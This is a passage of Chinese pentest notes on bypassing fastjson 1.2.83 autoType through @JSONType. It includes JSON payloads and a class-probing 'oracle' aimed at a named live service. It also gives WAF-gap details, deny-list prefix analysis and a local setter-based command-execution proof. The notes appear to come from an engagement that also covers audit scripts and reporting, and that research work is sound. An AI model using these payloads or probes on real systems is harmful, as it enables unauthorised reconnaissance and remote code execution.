| 5 | ★ **`jsonType`（资源探测 + `@JSONType`）** | ⚠ **两个子情形，别混**：(a) **URL 形态**（`jar:http:…`）需能解析 URL 的 loader ⇒ fat-jar ⇒ ✘ 实测零出网；(b) ★★ **类路径形态**（正常 FQCN，如 `com.x.Y`）⇒ **任何 ClassLoader 都能读**、**不需要 fat-jar** ⇒ **实测放行**（见下） |
| 6 | `expectClassFlag`（应用传了 `expectClass`） | ⚠ **两个子情形**：**顶层** ⇒ 实测无位置闸 ⇒ `expectClass=null` ⇒ ✘；★ **但外层若是自带 `@JSONType` 的 DTO**，其**字段声明类型**会变成嵌套位置的 `expectClass` ⇒ **实测开闸**（见下） |
| 7 | `loadClass` 成功 + 过 `ClassLoader/DataSource/RowSet` 拒绝校验 | 附加闸（1.2.83 新加） |

★ 两条**顺序**上的硬细节（判读时决定因果）：
- **出口 2 会绕过普通 deny 名单** —— `if (internalWhite) clazz = loadClass(...)` 后的
  `if (clazz != null) return clazz;` **排在** `!autoTypeSupport` 的 deny 扫描**之前**。
  ⇒ "`internalWhite` 里有没有危险类"是**真问题**。
- **出口 5（`jsonType`）排在出口 4 之后** ⇒ 若某发能走到末段抛 `autoType is not support.`，
  说明**出口 4 未命中且 `jsonType=false`**（自洽）。

★★ **`internalWhite` 反解结论（2026-09-20 二次修订：4 个全部识别）**：它**只有 4 个完整类名哈希，没有前缀**。
从**本地 jar 字节码**读出常量
（`javap -p -c -constants -cp fastjson-<ver>.jar com.alibaba.fastjson.parser.ParserConfig | grep -A4 INTERNAL_WHITELIST`），
再用 FNV-1a-64 反查 ⇒ **4 个全部命中**：

| 哈希 | 类名 |
|---|---|
| `0x9F2E20FB6049A371` | `java.util.Collections.UnmodifiableMap` |
| `0xA8AAA929446FFCE4` | `com.alibaba.fastjson.util.AntiCollisionHashMap` |
| `0x00D45D6F8C9017FA` | `java.util.concurrent.ConcurrentSkipListMap` |
| `0x64DC636F343516DC` | `java.util.concurrent.ConcurrentSkipListSet` |

**⇒ `internalWhite` 就是 4 个 Map/Set 容器（fastjson 解析时自用的结果容器）⇒ 可以确定「名单内无任何可用载体」**
（上一轮那句"只能写未识别"据此撤销）。

★ **反查方法上的一个坑（曾导致整批失效）**：类名清单若从 `jrt:/modules` 导出时**没剥掉模块前缀**，
会得到 `java.base.java.util.regex.Pattern` 这种**非法类名**，FNV 匹配**全部落空** ——
上一轮因此只认出手工输入的 1 个。**导出后必须先抽样 eyeball 格式**（合法 FQCN 里不该出现模块名）。

★★★★ **`jsonType` 退出 5(b)：类路径形态 —— 不需要 fat-jar，白名单态被功能性绕过（2026-09-20 datashare 实测）**

**别把"要 fat-jar"套到整个出口 5 上** —— 资源探测是 `getResourceAsStream(typeName.replace('.','/')+".class")`，
**它不区分类路径与 URL**。两个子情形必须分开判：

| 子情形 | 资源名 | 需要什么 | datashare 实测 |
|---|---|---|---|
| (a) URL 形态 | `jar:http://…!/X.class` | 能解析 URL 的 loader（Spring Boot fat-jar；Undertow 亦可） | ✘ **3 点式实验零出网**（正对照已证通道在记账） |
| **(b) 类路径形态** | `com/x/Y.class` | ★ **任何 ClassLoader 都能读** | ★★ **放行 + 成功实例化** |

**datashare 实测（3 发，单发/7s/未登录）**：
| 载荷 | HTTP | 长度 | `data` |
|---|---|---|---|
| `{"@type":"com.alibaba.fastjson.support.geo.Feature"}` | 200 | **79** | ★ **`行为验证码二次验证不通过`**（= 业务文案，**解析成功**） |
| `{"@type":"com.alibaba.fastjson.JSONPatch$Operation"}` | 200 | **79** | ★ 同上 |
| 上面那个 + `value` 嵌 `{"@type":"java.lang.Thread"}` | 200 | 84 | `autoType is not support. java.lang.Thread`（`expectClass=Object` **不开闸**） |

**判读锚点**：被拒的类一律回 `autoType is not support. <类名>`；而**放过**时回的是**业务文案**
（与 `param={"result":"x"}` 合法对象同形）⇒ **两档可分**。

★ 源码级两个要点（1.2.83）：
```java
if (clazz != null) {
    if (jsonType) { …; return clazz; }                    // ★★ 命中即短路返回
    if (ClassLoader/DataSource/RowSet.isAssignableFrom(clazz)) throw …;   // 硬拦被跳过
    if (expectClass != null) { … }
}
```
⇒ ① 只要 `getResourceAsStream` 能返回流就成立；② **`jsonType` 短路会跳过 `ClassLoader`/`DataSource`/`RowSet` 硬拦与 expectClass 校验**。

**`@JSONType` 类的清单怎么拿（甲方自查脚本）**：`复核/audit_jsontype_rce.py`（★ 2026-09-24 升级版，
替代早期的 `scan_jsontype_classes.py` —— 从"列清单"升级为"**直接出结论**"）
—— 口径 = **类级 `RuntimeVisibleAnnotations`**（与 fastjson `hasJsonType` 一致），**不是字符串匹配**：
fastjson 自带 `ParserConfig`/`TypeUtils`/`SerializeConfig`/`JSON` 等只是**引用**注解，**不是入口**（会被子串法误报）。
datashare 侧 jar 实测 = **11 个**：`support.geo.*` 十个 ＋ `JSONPatch$Operation` —— **全是数据 DTO，实例化零危害**。

★★★ **写这类 class 解析器时必踩的一个坑（2026-09-24，靠阳性对照才发现）**：
注解体（`RuntimeVisibleAnnotations` 的 attribute body）里存的是**常量池索引（二进制 u2）**，
**不是字符串**。按字节子串去匹配 `Lcom/alibaba/fastjson/annotation/JSONType;` **永远为假**
⇒ 第一版脚本把**本地自造的带注解类扫成 0 个**。正确做法：读 `num_annotations` → 逐个取 `type_index`
→ 查常量池 UTF8 表再比对；并递归跳过 `element_value_pairs`（tag `BCDFIJSZs`/`e`/`c`/`@`/`[` 各自长度不同）。
★ **如果没有做阳性对照，就会把"扫到 0 个"当成真结论。**

**升级版脚本做三件事**：① 找类级 `@JSONType`；② 标注**父类/接口是否命中 `ClassLoader`/`DataSource`/`RowSet`**
（★ 这三个族最危险）；③ 标注常量池里的**危险引用**（`Runtime`/`ProcessBuilder`/JNDI/`defineClass`/`ScriptEngine`/
`openStream`/文件写出/反射 `invoke`/`Unsafe`）。
**阳性对照已通过**：自造 `zzz.Evil`（`@JSONType`+`Runtime.exec`）→ ★★ 命中；`zzz.EvilLoader`（`extends ClassLoader`）→ ★★★ 命中；
`zzz.Ann`（带注解无危险）→ 无；fastjson 1.2.83 自带 → **11 个全无害**（与 `javap -v` 手工核一致）。
★ **口径诚实**：脚本只做**静态标注**；"setter 参数是否真能接到攻击者可控串"仍需人工 —— **这一层机器判不了**。

★★★★ **候选清单是「公开可枚举」的（2026-09-20 提出，★ 2026-09-24 大幅修正结论）**

★ **必须纠正 2026-09-20 那句"外部用户为零"—— 范围下得太窄了。**
当时只扫了 Dubbo/JFinal/cloudstars/JustAuth/AntFin SDK/JDCloud SDK/Addax/fastjson2 共 8 个库（全部 0），
就写了"第三方用户为零"。**用 GitHub 代码级检索一查，结论立刻被推翻**：

| 检索式（GitHub 代码搜索，精确匹配 import） | 命中文件数 |
|---|---|
| `import com.alibaba.fastjson.annotation.JSONType`（排除 alibaba 自己的仓库） | ★ **4,424** |

**命中的库/框架（会进入很多站点 classpath 的）**：
`aliyun/aliyun-log-java-sdk` · `hs-web/hsweb-framework`（`EnumDict`）· `datavane/tis`（`DescriptorsMeta`/`DescribableJSON`）·
`pixelsdb/pixels`（`Range`/`Filter`）· `ontio/ontology-java-sdk`（`Proof`/`SignRequest`/多个 JWT 类）·
`foxinmy/weixin4j`（`MemberUserInfo`）· `DTStack/DatasourceX`（`SubQuery`）· `edp963/davinci`（`RoleProject`）·
`cn.ponfee:commons-core`（★ **4 个**）· `RockyLOMO/rxlib`（`ULID`）· `xingcun/xc-spring-cloud-alibaba`（`MySqlJsonType`）

**实测扫过的**（`audit_jsontype_rce.py` + `scan_thirdparty_libs.py`）：

| 来源 | 带 `@JSONType` | 其中「可被滥用」 |
|---|---|---|
| fastjson 1.2.24/.47/.48/.68/.75/.80/.83（本地全版本） | **11**（每版一致） | **0**（全是数据 DTO） |
| `com.alibaba:fastjson:2.0.65`（1.x 兼容包） | 10（`geo.*`） | 0 |
| ★ **`cn.ponfee:commons-core:1.4`** | ★ **4**（`PlainStructure`/`NodePath`/`NodePath$FastjsonDeserializeMarker`/`Money`） | **0** |
| **`com.foxinmy:weixin4j-base:1.10.2`** | 0 | 0 |
| Dubbo / JFinal / cloudstars / JustAuth / AntFin SDK / JDCloud SDK / Addax | 0 / 0 / 0 / 0 / 0 / 0 / 0 | 0 |

⇒ ★ **修正后的准确口径**：
「**第三方库中确实存在带 `@JSONType` 的类**（已实测到 `commons-core` 的 4 个）；**但已扫描到的全部是数据 DTO，未发现可被滥用的**。」
**不能再写"第三方用户为零"** —— 那是"只扫了 8 个库"得出的过窄结论。

**★ 但"零"的部分仍然成立且更重要**：`commons-core` 那 4 个、fastjson 自带 11 个 —— **危险引用全部为空**。
⇒ **"带注解"是必要条件，不是充分条件；真正稀缺的是"带注解 **且** 可被滥用"。**

### ★★ 一条检索纪律：GitHub 的「组合检索」是**文件级**的，不能做语义查询

想直接搜"带注解 **且** 是 `ClassLoader` 子类"？**搜索做不到**。
`JSONType extends ClassLoader language:java` 这类查询匹配的是"**文件里同时出现这几个词**"，
实测返回的 25 条里大半是 **Jackson/PoCo 等别的 JSON 库**或 **PoC 仓库自身**（`RemoteJarClassLoader.java`）。
⇒ **"带注解 + 危险父类/危险 setter"这种语义条件，只能靠「下载 jar + 静态分析」，不能靠搜索。**
（对应的可执行工具：`audit_jsontype_rce.py`。）

**⇒ 候选集不是"大而未知"，而是"小且已穷举"**：

```
{ 能过闸的类 } ⊆ { fastjson 自带 11 个（已穷举，全是 DTO） } ∪ { 目标应用自己写的类（唯一残余，外部无源） }
```

★★ **出口 5(b) 的两条新边界（同轮实测）**

① **类名必须是「点形式且能被 `Class.forName` 加载」** —— 斜杠形式**不行**：

| 形式 | `typeName.replace('.','/')+".class"` | 实测 |
|---|---|---|
| `com.alibaba.fastjson.support.geo.Feature` | `com/alibaba/…/Feature.class` | **79B 放行** |
| `com/alibaba/fastjson/support/geo/Feature` | **同上（replace 无变化 ⇒ 资源名完全相同）** | **108B `autoType is not support.`** |

机制：资源名相同 ⇒ `jsonType` 探测**同样成立**，但下一步 `TypeUtils.loadClass(typeName, …)` 用的是**原始 typeName**，
`Class.forName` 对斜杠形式必然 CNFE ⇒ `clazz==null` ⇒ 抛 `autoType is not support.`。
⇒ 收紧边界：5(b) 要求**同时**满足 ① 资源名可 `getResourceAsStream` 读到、② **`Class.forName` 能加载**（纯点分隔）。

② **WAF 第 4 类形态缺口**：`<斜杠形式>` 也**没有规则**（200 到达应用层）。
前三类：`@type` 键转义（`\x4J`）／反连域名情报／`jar:`+`..`+整数 IP。
★ 但此条**不是绕过**（WAF 放行后闸把它挡住了）⇒ 适合写进报告的**防御有效性**段。

★★ **`Class` oracle 的完整判据表（2026-09-20 同批锚点自洽）**

| 响应 | 含义 |
|---|---|
| **43B**（`data` 为空串） | 类**加载不到** |
| **70B** `can not cast to JSONObject.` | 类**存在**（`loadClass` 成功） |
| **79B**（业务文案，如 `行为验证码二次验证不通过`） | 类**可认领**（`@JSONType` 命中 ⇒ `return clazz`） |
| **~100B** `autoType is not support. <名>` | 类**过不了闸** |

★ **限定**：43B 只能证「在 `defaultClassLoader` 可见范围内加载不到」，
**不能断言目标上没有该库**（可能 classloader 隔离）。
★ ⇒ **RCE 的精确条件** = classpath 上存在一个「带 `@JSONType` **且可被滥用**」的类（危险 setter/getter/构造链，
或本身是 `ClassLoader`/`DataSource`/`RowSet` 子类）。**自带的不够，必须扫应用自己的 classpath。**

### ★★★ `Class` oracle 的第二个用途：**只读依赖测绘**（2026-09-24 固化）

用 `{"@type":"java.lang.Class","val":"<类名>"}` **只发类名、零 payload**，就能得到**依赖清单**级情报 ——
比端口扫描/指纹更贴业务，而且**完全属档①**（不改任何状态）。用法：

1. **先测"候选字典"是否存在**：把 GitHub 检索到的第三方「带 `@JSONType` 的类」逐个探一遍
   （亲例：12 个候选**全部 43B 不在** ⇒ 目标依赖面很窄）。
2. **再测"一旦存在就有额外含义"的类**：其他序列化框架（`fastjson2`/Jackson/XStream/Hessian/Shiro）、
   现成 gadget 族（CC3/CC4/C3P0/BeanUtils）、基础设施（Spring/MyBatis/Druid/Servlet）。
   亲例：**10 条"不在"整体排除了"其他反序列化协议"这一大类**；**`collections4` 存在**则是关键情报。
3. ★ **必须成对配对照**：每批都要有「**必存在**」（`java.lang.String`/`java.lang.Runtime`）与
   「**必不存在**」（`zzz.NoSuchClass9f3a`）各一发，否则无法排除"全都返回同一个结果"这类系统性错误。

### ★★★ 核心判读纪律：**「存在 ≠ 可利用」，但「存在」本身就是情报**（2026-09-24 亲例）

亲例（乐信 datashare）：`Class` oracle 实测 **commons-collections4 的 5 个"干活件"全部在 classpath 上**
（`InvokerTransformer`/`ChainedTransformer`/`InstantiateTransformer`/`TransformingComparator`/`LazyMap`）。

**★★★ 但定位必须走完三层，只看第①层会得出错误结论（2026-09-24 亲例，我自己先写错又改回来）：**

| 说法 | 对错 |
|---|---|
| 「目标存在反序列化 RCE」 | ✘ **错**（不满足"命令跑起来"） |
| 「目标 classpath 上有完整的 CC4 gadget 套件」 | ✔ **对**（`Class` oracle 实测存在） |
| ~~「它降低了对"绕过"的要求，只需要绕过 gadget 就现成」~~ | ✘✘ **错** —— 我第一版这么写，实测后推翻 |

**为什么"只需要绕过"是错的 —— gadget 要能用，得过三道，本轮亲例全断：**

| 层 | 墙 | 实测 |
|---|---|---|
| ① **类能不能过闸** | ★★ **器件所在的「包前缀」被收进 `denyHashCodes`**（不是逐类名收录，见下方 §机制） | ★★ **把 `autoTypeSupport` 打开也依然 DENY**（5/6 全拒） |
| ② **能不能实例化** | 唯一不在名单的 `LazyMap` **无无参构造器** | `default constructor not found` |
| ③ **触发点能不能构造出来** | `PriorityQueue` 是 `Collection` ⇒ fastjson 走 `CollectionCodec`<br>⇒ **只填元素，不设 `comparator` 字段** | 对象形态直接语法错（`field null expect '['`） |

⇒ **CC4 链在 fastjson 上结构性不可用**（它的用武之地是 **Java 原生反序列化**）。**这才是准确定位。**

#### ★★★ §机制：`denyHashCodes` 存的是「完整类名 **＋ 包前缀**」的混合体（2026-09-24 复核修正）

上一版把①层写成"核心器件被**逐类名收录**进名单"—— **这个解释是错的**，本轮当命题复核后推翻：

- `javap -c` 读 `checkAutoType`：名单检查**发生在逐字符累进的循环体内**
  （`671: getfield acceptHashCodes … binarySearch` / `702: getfield denyHashCodes … binarySearch`
  / `711: iflt 764` / `764: iinc 20,1` / `767: goto 640`）
  ⇒ **每累进一个字符，就拿当前前缀的哈希去查一次名单** ⇒ 条目可以是**任意长度的前缀**，不限于完整类名；
- 用 fastjson 自己的 `TypeUtils.fnv1a_64` 手算并比对实测 dump 的 **169 条**：

| 候选 | 是否在名单 |
|---|---|
| **`org.apache.commons.collections4.functors`** | ★★ **在** ⇒ 整包被拒 |
| **`org.apache.commons.collections4.comparators`** | ★★ **在** ⇒ 整包被拒 |
| `org.apache.commons.collections4.map` | **不在** ⇒ `LazyMap` 因此能过①层 |
| `org.apache.commons.collections4.Transformer` | 在（完整类名） |
| `java.lang.Thread` | 在（完整类名） |
| `org.apache.commons.collections.functors`（CC3 时代） | 在 |

⇒ **`functors` / `comparators` 两包被"整包拒"**：该包下**所有**类两档都 DENY，
包括根本不是 gadget 的 `FunctorUtils` —— 这正说明命中的是**前缀**而非类名。
而 `LazyMap` 之所以独活，只是因为 **`map` 包没被收进名单**，它死在②层（无无参构造器）。

★★ **可复用判读**：观察到"**某包下所有类都被拒**"时，别逐个类猜，**直接算包前缀的哈希查名单**。
★★ **对新目标的意义**：若某站是黑名单态（`autoTypeSupport=true`），
**"哪些包被整包拒 / 哪些包漏了"就是一张决定性地图**，值得优先测绘。
（★ 另附一条硬事实：1.2.83 的 **`acceptHashCodes` 长度 = 0** —— 名单为空，
所以"滑中 accept 名单"这条出口在当前版本上**无内容可滑**。）

**⇒ 正确的报告口径**：写「**classpath 上存在完整 CC4 gadget 族**，经 fastjson 与原生反序列化**两条路径均不可达**；
属**依赖治理**问题（引入了与业务无关的高危 gadget 库），建议业务未用则**移除/隔离**、
必须保留则**纳入资产清单并在每次升级/部署变更时复查**」。**不改变定级。**

★★★ **由此固化两条高价值方法**：

**(1) `autoTypeSupport=true` 是「最有利情况测试台」** ——
把开关打开再测，能**区分「被白名单拦」与「被 `denyHashCodes` 硬黑名单拦」**：
前者开开关就通，后者**仍然拒**。**纯本地、零风险，却多得到一整层信息。**
★ **判读细化**：开开关后**仍 DENY** 的，要再分两种 ——「完整类名命中」还是「包前缀命中」（见上方 §机制）。
★ **另外必须防「探针静默失效」**（2026-09-24 亲例，差点得出**相反**结论）：
同一天用 `{"\x4Jtype":"java.util.PriorityQueue"}` 判总开关时，**第一版 5 发全部返回业务文案**，
若只看判据三发会读成「全部放行 ⇒ autotype = **ON**」。**真因是键写成了 `\\x4Jtype`（双反斜杠）** ——
`scanString` 先把 `\\` 解成 `\`，键成了字面 `\x4Jtype`，**压根没被解码成 `@type`**，请求退化成普通业务对象。
用**单反斜杠**（Python 源码里写 `'\\x4Jtype'`）才生效。救回结论的是两个锚点：
对照 S4（必被拒的 `java.lang.Thread`，历史值一直是 DENY）与 S2（内建表必放行的 `java.util.TreeMap`）。
⇒ **纪律：探针必须同时具备「阳性必通」与「阴性必拒」两档参照**；缺任一个，"全部同形"就无法区分
「目标行为」与「探针没生效」。**键转义这类失效不报错，只给你一个看起来很像结论的错值。**

★★ **同一天（09-24）第二种"静默失效"：把「传输层错误」当成「目标响应」**
批量打 35 个类名时，**末 3 条返回 67 字节**，既非放行（79B）也非被拒（应 86/89B）——
看着像"目标的一个新档位"。**真相是我这边的代理 502**：
`URLError: <urlopen error Tunnel connection failed: 502 Bad Gateway>`，
而脚本**把异常字符串直接塞进了 `data` 字段**。
★ **是「期望字节数自检」把它抓出来的**：本目标响应体长度**可预知**
（`43 + len(data)`；被拒时 `data = "autoType is not support. " + 类名`），
其余 32 条逐条精确匹配、这 3 条不匹配 ⇒ 立刻怀疑。
⇒ **两条硬纪律**：① **传输层错误必须与应层响应分开标记**（单独字段 `transport_ok` / `TRANSPORT_FAIL`），
   **绝不混入 `data`**；② **批量探测必须用「期望字节数」自检**，一条不匹配就查，别直接进结论表。
   （补测姿势：**重试 3 次 + 直连兜底**。）

★ 必须配「开关确实生效」的对照（本轮用 `java.util.PriorityQueue` → 开开关后 PASS），
否则"全 DENY"无法与"开关没生效"区分。

**(2) 「链能不能活」要按三层逐层验**：
**① 类过闸 → ② 能实例化（有无可用构造器/字段）→ ③ 触发点能被构造出来**。
★ 补充机制点：**`PriorityQueue.add()` 也会触发 `compare()`**（元素 ≥2 时 `siftUp` 调比较器）
⇒ "CC4 链只能靠 `readObject` 触发"这个常见说法**不完整**；触发点的存在性要每次单独验。

★ **一个易读错的判据**：`checkAutoType` 返回 **`null` = 类加载不到（不存在）**，
**不是"被拒"**。本轮 `zzz.Probe`/`WireFeed` 的 `null` 都属于"类不在 classpath"，读成 DENY 就错了。

★ **通用化**：任何"组件降级到白名单态才安全"的场景都适用 ——
**「有没有利用物」和「能不能利用它」是两件事，而且后者可能隔着好几层，报告要把每一层分开写。**
★★ **修复含义**：**关 autoType ≠ 修好** —— autoType=false 且 safeMode=false 时门口仍有这扇门；
**SafeMode 是唯一在触发路径之前一刀切的做法**。

★★★★ **`@JSONType` 出口的实际杀伤力上限（2026-09-24 本地 1.2.83 单变量实测，此前只写到"能过闸"）**

方法：**本地自造类 + 本地 JVM**，唯一变量 = **类上有没有 `@JSONType`**。

| 组 | 载荷 | 结果 |
|---|---|---|
| **A** | `@JSONType` ＋ `setCmd` 里 `Runtime.exec`<br>`{"@type":"zzz.Evil","cmd":"whoami"}` | ★★★ **实例化 → setter 被调 → 命令真的执行（`whoami` 输出落盘）** |
| **B** | 同形**不带**注解 | `autoType is not support. zzz.Plain` |
| **C** | `@JSONType` ＋ `extends ClassLoader` | ★★ **实例化 + setter 被调** ⇒ 硬拦确实被短路 |
| **D** | 同形**不带**注解 | `autoType is not support.` |
| **E1** | 外层 `@JSONType`，字段类型是**白名单外的具体类**（该名字本身无注解、不在白名单） | ★★★ **那个字段类被实例化 + 它的 setter 被调** ⇒ **认领资格会经 `expectClass` 传染一层** |
| **E2** | 外层 `@JSONType`，字段是**宽接口**，内层嵌带注解的类（类型**不兼容**） | ★★★ **内层类被实例化、setter 副作用已发生**，之后才抛 `ClassCastException` ⇒ **短路优先于类型兼容检查，副作用先落地** |
| **E3** | 与 B **同一载荷**，但在 E1 **认领过该类名之后**、同一 JVM 内再打 | ★ **PASS**（B 为 DENY）⇒ ★★ **证实 `jsonType` 写进程级缓存** |

**⇒ 三条硬结论**：
1. **断言"带 `@JSONType` + 有副作用 setter ⇒ 直接命令执行"成立**（此前只是推断）；
2. **能力可传染**：外层类的**具体类字段**会被一起带过闸（`expectClass` 传一层）；
   ⇒ **甲方自查不能只看"带 `@JSONType` 的类本身"，要追一层它的字段类型指向谁**；
3. **`jsonType=true` 会写 `TypeUtils.mappings`（进程级缓存）** ——
   同一 JVM 内某类名**被认领过一次之后，同名请求不再需要注解**。
   ★ 这不扩大"可利用类的集合"（缓存键 = 首次认领的名字），但**意味着"同一发载荷在不同时刻结果可能不同"**
   ⇒ **判定与排查必须考虑请求顺序**，别只看配置。

**★ 精确的利用条件（四条，缺一不可）**：
① `X` 编译期依赖 fastjson（否则带不上注解）；② `X` 带**类级** `@JSONType`；
③ `X.class` 能被 `getResourceAsStream` 读到（`WEB-INF/classes` 与 `WEB-INF/lib/*.jar` 均可 ⇒ **WAR 部署照样成立**）；
④ `X` 可被滥用（**有副作用 setter/构造链**，**或本身是 `ClassLoader`/`DataSource`/`RowSet` 子类** —— 后者连硬拦都被短路）。
**满足即直接命令执行，且不需要** fat-jar / 开 autoType / accept 名单 / 注册 handler。

★ **外部穷举的边界（★ 2026-09-24 修正 → 同日再收敛为"穷举已到头"）**：曾写"公开库带 `@JSONType` 的类 = 0"——**过窄**，
那只覆盖了 8 个库。GitHub 精确检索显示 **4,424 个文件 import 了该注解**，且已实测到
`cn.ponfee:commons-core:1.4` 有 **4 个**带注解的类。**但扫到的全部是数据 DTO**（危险引用为空）；
fastjson 自带 11 个**全在内建表里**（用不到这条分支）
⇒ **残余仍可能是目标应用自己写的类 ⇒ 由信息持有方一行命令回答**（`复核/audit_jsontype_rce.py`）。

★★★ **同日（09-24）把这条穷举做到底 —— 结论：公开源已到头，目标是 0**

1. **库级穷举**：扫 **30 个主流库 / 44,000+ 个真实类** ⇒ **`@JSONType` 全部 = 0**。
   含所有"主流 fastjson 依赖方"：alipay-sdk（22,962 类）、nacos 三包（5,136）、kafka-clients（2,356）、
   dubbo 2.7（1,722）、redisson（1,551）、lettuce（1,367）、weixin-java（1,061）、jfinal（610）、jedis（575）、
   forest（411）、easyexcel、sentinel、seata、xxl-job、sa-token、shardingsphere、mybatis-plus、
   rocketmq、gson、kryo、jsoup、hutool-json、腾讯云 SDK、阿里云 core、JustAuth …
   ★ **结构性原因**：`@JSONType` 控制**序列化行为**（`orders`/`ignores`/`naming`），
   第三方库没理由把它挂在**对外 API 类型**上（等于把 fastjson 泄漏进公共契约）。
2. **类名级实测**：GitHub 精确检索提取出**真实存在于公开库的 35 个 `@JSONType` 类名**
   （`cn.ponfee…Money`、`com.avos.avoscloud.AVRelation`、`org.starcoin.bean.*`、
   `com.aliyun.openservices.log.common.*`、`com.github.ontio.ontid.*`、`edp.davinci…`、
   `com.qlangtech.tis.*`、`io.pixelsdb.*`、`weixin4j…` …），**逐个打进目标**：
   ★★ **35/35 全部被拒，0 个过闸**（5 发对照同批通过 ⇒ 判据有效）。
3. **机制否证：`@JSONType(seeAlso=…)` 不传染**（本轮本地实测，假设原以为能让候选集变大）：
   `Ann2`（自带注解 + `seeAlso={Plain,NoAnn}`）**认领成功**（真实例化 + setter 被调），
   但 `NoAnn` 在**认领前后都是 DENY** ⇒ **seeAlso 不放行被指向的类**；
   `@JSONType` 的豁免**只覆盖自带注解的类本身**。`ProcessBuilder`/`InitialContext` 同样被拒。

⇒ **最终口径**：写「**公开源中带 `@JSONType` 的类已穷举；目标上 0 个可过闸**」，
残余**只能是目标应用自己写的类**（外部无源，甲方一行命令可查）。
**不要**再写"公开库 = 0"（那会漏掉 35 个真实类名这块工作量）；也不要写"可能存在"（公开源已到头）。

★★ **第三方检测工具（GitHub 上已有的，可引作生态证据）**：
`dinosn/fastjson-jsontype-rce-lab` 的 `scanner/`（被动请求/日志检测 + 静态产物清单 + 无执行可达性探针）·
`Detect-DefenseLab/fastjson-1.2.83-rce-detection`（**snort / modsecurity / openresty(Lua) / RASP(JS) / YARA** 全套）·
`hl0rey/fastjson-safemode-detector`（Java Agent 检测 SafeMode）· `xuing/oh-my-rasp` · `Netomize/RFiles`（`.yar`）。
**★ 全是"内部视角"工具**（需应用日志/产物/植入 agent）⇒ 外部未授权视角**用不了**，
但**它们的"存在"本身证明这条链是业内公认的真实威胁**，可写进报告的"风险确认"部分。

★★★ **写 class 静态分析器时必做的「双方向对照」**（2026-09-24，三轮才校准，亲例 `audit_jsontype_rce.py`）：

| # | 症状 | 根因 |
|---|---|---|
| 1 | **自造带注解类被扫成 0 个** | 注解体里是**常量池索引（二进制）**，按字节子串匹配字符串**永远为假** |
| 2 | 正常类被标"危险" | `java/lang/Runtime` 用**前缀**匹配，把 `java/lang/RuntimeException` 一起中了 |
| 3 | 无危险类也被标可疑 | `java/lang/System` 进危险表 —— **几乎每个类都引用它** |

⇒ **两个方向的对照都必须有**：
「**应当命中**的样本」（自造 `@JSONType` + `Runtime.exec`、`extends ClassLoader`）用来发现**太窄**；
「**应当为无**的样本」（带注解但无危险的普通类）用来发现**太宽**。
**只做一边，就会把"0 个"或"全部可疑"当成真结论。**

★★★★ **出口 6/7：`expectClass` 位置闸 —— 顶层没有，嵌套有（2026-09-20 datashare 实测），并由此得到一个「过闸 oracle」**

**实测（同一端点，4 发，单发/7s/未登录）**：
| # | 载荷 | 长度 | `data` | 判读 |
|---|---|---|---|---|
| H1 | `{"@type":"…geo.FeatureCollection","features":[{"@type":"com.rometools.rome.feed.WireFeed"}]}` | 135 | ★ **`type not match. com.rometools.rome.feed.WireFeed -> com.alibaba.fastjson.support.geo.Feature`** | ★★ **`WireFeed` 被 `loadClass` 了** |
| H2 | `{"@type":"com.rometools.rome.feed.WireFeed"}`（顶层对照） | 100 | `autoType is not support. …WireFeed` | 顶层被拒 |
| H3 | 同 H1 位置嵌 **空对象** `JdbcRowSetImpl`（**无 `dataSourceName`/`autoCommit` ⇒ 零 JNDI**） | 97 | `autoType is not support. com.sun.rowset.JdbcRowSetImpl` | ★ **deny 名单照旧生效** |
| H4 | `JdbcRowSetImpl` 顶层对照 | 97 | 同上 | — |

★ **判读依据**：`type not match` 在源码里**只在 `TypeUtils.loadClass(...)` 成功之后**才抛：
```java
if (clazz != null) { … if (expectClass != null) {
    if (expectClass.isAssignableFrom(clazz)) return clazz;
    else throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName()); } }
```
★ **机制**：**顶层实测无位置闸（`expectClass=null`）**，但**外层若是一个自带 `@JSONType` 的 DTO**，
它的**字段声明类型**就成为嵌套位置的 `expectClass` ⇒ `expectClassFlag=true` ⇒ `loadClass` 对**任意非 deny 类名**执行。
⇒ ★★ **「顶层被拒」≠「嵌套也被拒」** —— 这是一个**位置相关的过闸差**（此前"无位置闸"的结论只对顶层成立）。

★★★ **由此得到的通用探针 —— 「过闸 oracle」**（只发类名、**零字节码**，成本 1 发/类名）：
```
{"@type":"<自带 @JSONType 的外层 DTO>","<具体类字段>":[{"@type":"<候选类名>"}]}
  → `type not match. <候选> -> <外层字段类型>`  ⇒ ★ 候选**过了闸**（被 loadClass）
  → `autoType is not support. <候选>`            ⇒ 没过（deny 名单 / 不存在）
```
★ **两道硬墙（决定它到不了 RCE）**：
1. **assignability 墙** —— `loadClass` 成功后**紧跟** `expectClass.isAssignableFrom(clazz)`，不通过就抛 `type not match`、**不实例化**。
   ⇒ 用 `FeatureCollection` 当外壳，**只有 `Feature` 子类能走完**。★ 已逐个查过 fastjson 自带 11 个可认领类的字段类型：
   要么是 `Object`/`Map`（**在忽略表**）要么是**具体 geo 类型** ⇒ **自带类接不上 gadget**；
   要接上需要「**外层 DTO 的字段声明为宽接口/抽象类**」⇒ **只能是应用自己的 DTO**。
2. **语义墙** —— "有没有危险 setter/构造链"是代码语义，外部无 jar/源码判断不了 ⇒ 必须信息持有方答。
#### ★★★ 「钓应用 DTO 类名」——两个回显通道 + 一个必踩的坑（2026-09-24 修正）

**这条要纠正 09-20 的一次错误归因。** 当时用 `validate`/`token`/`randstr`/`seccode` 四发钓名字，
全回 `autoType is not support.`，我记的原因是「这些字段是**泛型读取、无 DTO 绑定**」。
**真实原因不是字段名，而是那四发的嵌套值用了 `WireFeed`（会被闸拒）——在解析阶段就抛了，根本走不到 `getObject`。**
（又一次「用另一个观察外推」的同类错误：把"解析阶段的拒绝"读成了"业务层没绑定"。）

**① 嵌套位置为什么一律拒（与被钓的键名无关）**

`JSON.parseObject(param)` 得到 `JSONObject` ⇒ 其嵌套位置 **`expectClass = null`**（外层是 `JSONObject`，字段类型 `Object`）。
⇒ 嵌套里**任何进不了内建表的类名，无论挂在哪个键名下，都在解析阶段就抛**。本地对照（1.2.83）：

| 嵌套值 | 结果 |
|---|---|
| `{"a":{"@type":"com.rometools.rome.feed.WireFeed"}}` | ✘ `autoType is not support.` |
| `{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}` | ✘ 同上 |
| `{"a":{"@type":"java.lang.Thread"}}` | ✘ 同上 |
| ★ `{"a":{"@type":"com.alibaba.fastjson.support.geo.Feature"}}` | ✔ **OK** ⇒ **只有用「能过闸」的类，才能走到业务层** |

**② 用「能过闸」的值，可以钓出应用类名 —— 机制实证**

```java
